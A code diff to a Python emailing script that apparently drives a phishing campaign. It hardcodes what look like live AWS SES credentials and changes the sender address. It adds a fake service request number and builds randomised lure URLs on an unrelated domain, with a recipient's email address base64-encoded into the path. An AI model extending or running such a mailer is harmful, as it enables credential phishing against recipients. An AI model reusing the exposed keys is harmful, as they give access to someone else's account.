@@ -27,7 +27,7 @@ SES_SMTP_HOST = 'email-smtp.eu-west-1.amazonaws.com'  # Updated SMTP endpoint
 SES_SMTP_PORT = 587  # Use STARTTLS for this port
 SES_FROM_NAME = ''  # Updated name
 SES_ACCOUNT_ID = 'AKIAZTK2I3NAIPKVMD4R'  # Updated name
-SES_FROM_EMAIL = 'info@mahmoudelfar.com'  # Updated user
+SES_FROM_EMAIL = 'support@mahmoudelfar.com'  # Updated user
 SES_EMAIL_PASSWORD = 'BELr4YI3jcptUpDsryue63E5YsEXM2GNmbV3jkKbmce3'  # Updated AWS SES SMTP password
 AWS_REGION = 'eu-west-1'  # Region for API or additional integrations
 
@@ -59,8 +59,16 @@ def generate_action_url(base_url):
     return base_url
 
 
+def generate_service_request_number():
+    """
+    Generate a service request number in the format O(random_string).
+    """
+    return 'O' + generate_random_string(8)
+
+
 # html variables
 date_long = datetime.now().strftime("%B %d, %Y")
+service_request_number = generate_service_request_number()
 action_url_template = "https://Rand(8).lellisadvocacia.com.br/Rand(6)Z2VvcmdlcXVpbjE5QGdtYWlsLmNvbQ==Rand(6)"
 action_url = generate_action_url(action_url_template)
 print("Generated Action URL:", action_url)
